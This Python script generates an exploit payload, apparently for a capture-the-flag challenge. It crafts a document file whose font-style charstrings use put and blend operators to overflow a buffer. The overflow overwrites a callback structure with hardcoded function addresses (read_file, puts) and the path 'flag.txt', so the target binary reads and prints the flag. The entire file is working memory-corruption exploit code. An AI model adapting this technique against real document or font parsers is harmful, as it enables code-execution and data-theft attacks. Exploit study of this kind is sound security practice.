#!/usr/bin/env python3
import argparse, struct
from pathlib import Path

CALL = 0x43414C4C
PUTS_PLT = 0x401170
READ_FILE = 0x401791
PATH_BSS = 0x406204
SIZE_OUT_BSS = 0x406220


def enc(n: int) -> bytes:
    if -107 <= n <= 107:
        return bytes([n + 139])
    if 108 <= n <= 1131:
        v = n - 108
        return bytes([247 + v // 256, v % 256])
    if -1131 <= n <= -108:
        v = -n - 108
        return bytes([251 + v // 256, v % 256])
    if -32768 <= n <= 32767:
        return b"\x1c" + struct.pack(">h", n)
    return b"\x1d" + struct.pack(">I", n & 0xFFFFFFFF)


def split_qword(x: int) -> tuple[int, int]:
    return x & 0xFFFFFFFF, (x >> 32) & 0xFFFFFFFF


def op_put(idx: int, val: int) -> bytes:
    return enc(val) + enc(idx) + b"\x0c\x14"


def op_blend(off: int, count: int) -> bytes:
    return enc(off) + enc(count) + b"\x0c\x10"


def endchar() -> bytes:
    return b"\x0e"


def cff_index(objects: list[bytes]) -> bytes:
    offs = [1]
    cur = 1
    blob = b""
    for obj in objects:
        blob += obj
        cur += len(obj)
        offs.append(cur)
    off_size = 1 if cur <= 0xFF else 2 if cur <= 0xFFFF else 3 if cur <= 0xFFFFFF else 4
    return struct.pack(">H", len(objects)) + bytes([off_size]) + b"".join(x.to_bytes(off_size, "big") for x in offs) + blob


def document(charstrings: list[bytes], text: bytes = b"AB") -> bytes:
    header = struct.pack(">HHHHI", 1, 1, 0, len(charstrings), len(text))
    enc_entries = b"".join(bytes([ord("A") + i]) + struct.pack(">H", i) for i in range(len(charstrings)))
    return header + enc_entries + cff_index(charstrings) + text


def write_bytes(vals: list[int], start_index: int, data: bytes) -> None:
    for j in range(0, len(data), 4):
        vals[start_index + j // 4] = struct.unpack("<I", data[j:j+4].ljust(4, b"\x00"))[0]


def build_overflow_values(callback: int, arg0: int, count: int) -> list[int]:
    vals = [0] * max(count, 30)
    vals[16] = CALL
    vals[17] = 0
    vals[18], vals[19] = split_qword(callback)
    vals[20], vals[21] = split_qword(arg0)
    write_bytes(vals, 23, b"flag.txt\x00")
    return vals


def callback_charstring(callback: int, arg0: int, count: int, *, force_len: int | None = None) -> bytes:
    vals = build_overflow_values(callback, arg0, count)
    cs = b"".join(op_put(i, v) for i, v in enumerate(vals[:count]))
    cs += op_blend(0, count) + endchar()
    if force_len is not None:
        if len(cs) > force_len:
            raise ValueError(f"charstring already {len(cs)} bytes, cannot force length {force_len}")
        cs += endchar() * (force_len - len(cs))
    return cs


def build_payload(buf_ptr: int) -> bytes:
    cs_read = callback_charstring(READ_FILE, PATH_BSS, 30, force_len=SIZE_OUT_BSS)
    cs_puts = callback_charstring(PUTS_PLT, buf_ptr, 22)
    return document([cs_read, cs_puts], b"AB")


def main() -> None:
    ap = argparse.ArgumentParser(description="Generate the final payload once the real flag buffer pointer is known")
    ap.add_argument("--buf", required=True, help="real read_file() buffer pointer, e.g. 0x4074c0")
    ap.add_argument("-o", "--output", default="payload_final.mdoc")
    args = ap.parse_args()
    buf = int(args.buf, 0)
    data = build_payload(buf)
    Path(args.output).write_bytes(data)
    print(f"wrote {args.output} ({len(data)} bytes)")
    print(f"size_out via RSI -> 0x{SIZE_OUT_BSS:x}")
    print(f"puts buffer       -> 0x{buf:x}")


if __name__ == "__main__":
    main()
